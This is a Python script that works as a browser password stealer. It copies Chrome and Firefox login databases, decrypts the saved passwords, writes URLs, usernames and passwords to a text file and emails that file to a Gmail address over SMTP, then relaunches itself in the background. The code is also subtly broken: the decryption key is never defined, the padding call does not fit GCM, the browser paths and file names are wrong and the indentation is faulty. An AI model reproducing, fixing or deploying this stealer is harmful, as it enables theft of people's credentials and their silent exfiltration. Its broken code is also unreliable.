import os
import sys
import json
import shutil
import sqlite3
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
from win32com.client import Dispatch
from os.path import expanduser
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from subprocess import Popen


def decrypt_payload(payload, key):
    decoded_payload = base64.b64decode(payload)
    nonce, ciphertext = decoded_payload[:12], decoded_payload[12:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')


def get_password(profile_path):
    password_path = os.path.join(profile_path, 'Login Data')
    shutil.copy2(password_path, 'Loginvault.db') # Make a copy for security purposes

    conn = sqlite3.connect('Loginvault.db')
    cursor = conn.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    password_data = cursor.fetchall()

    if len(password_data) == 0:
        return

    with open('Login Data', 'rb') as f:
        login_data = f.read()

    os.remove('Loginvault.db') # Remove the copied file after reading data

    password_list = []

    for data in password_data:
        url, username, encrypted_password = data
        decrypted_password = decrypt_payload(encrypted_password, key)
        password_list.append({
            'url': url,
            'username': username,
            'password': decrypted_password
        })

    return password_list

def send_email(file_path):
    # Set up the email parameters
    sender_email = "your_email@gmail.com"
    receiver_email = "admin@gmail.com"
    password = "your_email_password"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Browser Saved Passwords"

    with open(file_path, "rb") as f:
        attachment = MIMEText(f.read(), _subtype="plain", _charset="utf-8")
        attachment.add_header("Content-Disposition", "attachment", filename=os.path.basename(file_path))
        msg.attach(attachment)

    # Connect to the email server and send the email
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()


def main():
    user_profile = expanduser('~')
    roaming_profile = os.path.join(user_profile, 'AppData', 'Roaming')

    browser_profiles = [
        ('Chrome', 'Google', 'Chrome', os.path.join(roaming_profile, 'Google', 'Chrome', 'User Data')),
        ('Firefox', 'Mozilla', 'Firefox', os.path.join(roaming_profile, 'Mozilla', 'Firefox', 'Profiles'))
    ]

    with open('browser_data.txt', 'w') as f:
        for browser, company, product, path in browser_profiles:
            if os.path.exists(path):
                f.write(f'\n\n{browser} Saved Passwords:\n\n')

                if browser == 'Firefox':
                    firefox_profile_path = os.path.join(path, [name for name in os.listdir(path) if os.path.isdir(os.path.join(path, name))][0])
                    password_data = get_password(firefox_profile_path)
                else:
                    password_data = get_password(path)

                if password_data:
                    for password in password_data:
                        f.write(f"URL: {password['url']}\nUsername: {password['username']}\nPassword: {password['password']}\n\n")
     send_email('browser_data.txt')

     # Run the script in the background
    Popen(sys.executable, [' ', __file__])
    sys.exit()
if __name__ == '__main__':
    main()